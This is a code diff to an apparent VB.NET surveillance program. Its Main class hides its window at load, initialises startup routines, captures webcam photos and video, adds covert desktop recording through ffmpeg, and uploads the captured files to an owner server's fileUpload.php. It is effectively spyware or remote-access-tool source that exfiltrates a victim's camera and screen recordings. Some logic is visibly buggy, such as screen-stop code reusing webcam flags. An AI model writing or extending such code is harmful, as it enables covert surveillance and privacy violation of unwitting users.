@@ -4,6 +4,7 @@ Public Class Main
     Dim IMAGEN As Image
     Dim isWebCamActive As Boolean = False
     Dim isWebCamRecording As Boolean = False
+    Dim isScreenRecording As Boolean = False
     Public Const WM_CAP As Short = &H400S
     Public Const WM_CAP_DLG_VIDEOFORMAT As Integer = WM_CAP + 41
     Public Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10
@@ -66,74 +67,21 @@ Public Class Main
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Hide()
         parameters = Command()
-        ReadParameters(parameters)
         StartUp.Init()
+        ReadParameters(parameters)
         AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
     End Sub
 
-    Function TakeCamPicture() As String
-        Try
-            Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamPicture.png"
-            If My.Computer.FileSystem.FileExists(filePath) Then
-                My.Computer.FileSystem.DeleteFile(filePath)
-            End If
-            SendMessage(hHwnd, WM_CAP_EDIT_COPY, 0, 0)
-            DATOS = Clipboard.GetDataObject()
-            IMAGEN = CType(DATOS.GetData(GetType(System.Drawing.Bitmap)), Image)
-            IMAGEN.Save(filePath, Imaging.ImageFormat.Png)
-            Return filePath
-        Catch ex As Exception
-            AddToLog("TakeCamPicture@Main", "Error: " & ex.Message, True)
-            Return 1
-        End Try
-    End Function
-
-    Function StartCamRecord() As String
-        Try
-            If Not isWebCamRecording Then
-                SendMessage(hHwnd, WM_CAP_DLG_VIDEOFORMAT, 0, 0)
-                SendMessage(hHwnd, WM_CAP_SEQUENCE, 0, 0)
-                isWebCamRecording = True
-            End If
-            Return 0
-        Catch ex As Exception
-            AddToLog("StartCamRecord@Main", "Error: " & ex.Message, True)
-            Return 1
-        End Try
-    End Function
-
-    Function StopCamRecord()
-        Try
-            Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamVideo.avi"
-            If isWebCamRecording Then
-                SendMessage(hHwnd, WM_CAP_STOP, 0, 0)
-                SendMessage(hHwnd, WM_CAP_FILE_SAVEAS, 0, filePath)
-                Try
-                    If My.Computer.FileSystem.FileExists("C:\CAPTURE.avi") Then
-                        My.Computer.FileSystem.DeleteFile("C:\CAPTURE.avi")
-                    End If
-                Catch
-                End Try
-            End If
-            Return filePath
-        Catch ex As Exception
-            AddToLog("StopCamRecord@Main", "Error: " & ex.Message, True)
-            Return 1
-        End Try
-    End Function
-
     Sub UploadFileToServer(ByVal filePath As String)
         Try
-            If filePath <> 1 Or filePath.ToLower <> "null" Or filePath <> Nothing Then
-                Dim fileName As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_Scrincam.avi"
-                My.Computer.Network.UploadFile(fileName, HttpOwnerServer & "/fileUpload.php")
+            If filePath.ToLower <> "null" Or filePath <> Nothing Then
+                My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
                 End
             End If
         Catch ex As Exception
             AddToLog("UploadFileToServer@Main", "Error: " & ex.Message, True)
         End Try
     End Sub
-
     Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
         Try
             If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
@@ -150,4 +98,83 @@ Public Class Main
             AddToLog("SessionEvent@Init", "Error: " & ex.Message, True)
         End Try
     End Sub
+#Region "WebCam Service"
+    Function TakeCamPicture() As String
+        Try
+            Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamPicture.png"
+            If My.Computer.FileSystem.FileExists(filePath) Then
+                My.Computer.FileSystem.DeleteFile(filePath)
+            End If
+            SendMessage(hHwnd, WM_CAP_EDIT_COPY, 0, 0)
+            DATOS = Clipboard.GetDataObject()
+            IMAGEN = CType(DATOS.GetData(GetType(System.Drawing.Bitmap)), Image)
+            IMAGEN.Save(filePath, Imaging.ImageFormat.Png)
+            Return filePath
+        Catch ex As Exception
+            AddToLog("TakeCamPicture@Main", "Error: " & ex.Message, True)
+            Return "null"
+        End Try
+    End Function
+    Function StartCamRecord() As String
+        Try
+            If Not isWebCamRecording Then
+                SendMessage(hHwnd, WM_CAP_DLG_VIDEOFORMAT, 0, 0)
+                SendMessage(hHwnd, WM_CAP_SEQUENCE, 0, 0)
+                isWebCamRecording = True
+            End If
+            Return 0
+        Catch ex As Exception
+            AddToLog("StartCamRecord@Main", "Error: " & ex.Message, True)
+            Return "null"
+        End Try
+    End Function
+    Function StopCamRecord() As String
+        Try
+            Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamVideo.avi"
+            If isWebCamRecording Then
+                SendMessage(hHwnd, WM_CAP_STOP, 0, 0)
+                SendMessage(hHwnd, WM_CAP_FILE_SAVEAS, 0, filePath)
+                Try
+                    If My.Computer.FileSystem.FileExists("C:\CAPTURE.avi") Then
+                        My.Computer.FileSystem.DeleteFile("C:\CAPTURE.avi")
+                    End If
+                Catch
+                End Try
+                isWebCamRecording = False
+            End If
+            Return filePath
+        Catch ex As Exception
+            AddToLog("StopCamRecord@Main", "Error: " & ex.Message, True)
+            Return "null"
+        End Try
+    End Function
+#End Region
+#Region "Screen Service"
+    Function StartScreenRecord() As String
+        Try
+            Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_ScreenVideo.mkv"
+            If Not isScreenRecording Then
+                Process.Start("cmd.exe", "/k ffmpeg -f gdigrab -framerate 25 -i desktop " & filePath)
+                isScreenRecording = True
+            End If
+            Return 0
+        Catch ex As Exception
+            AddToLog("StartScreenRecord@Main", "Error: " & ex.Message, True)
+            Return "null"
+        End Try
+    End Function
+    Function StopScreenRecord() As String
+        Try
+            Dim filePath As String = DIRCommons & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_ScreenVideo.mkv"
+            If isWebCamRecording Then
+                SendMessage(hHwnd, WM_CAP_STOP, 0, 0)
+                SendMessage(hHwnd, WM_CAP_FILE_SAVEAS, 0, filePath)
+            End If
+            Return filePath
+        Catch ex As Exception
+            AddToLog("StopScreenRecord@Main", "Error: " & ex.Message, True)
+            Return "null"
+        End Try
+    End Function
+#End Region
 End Class
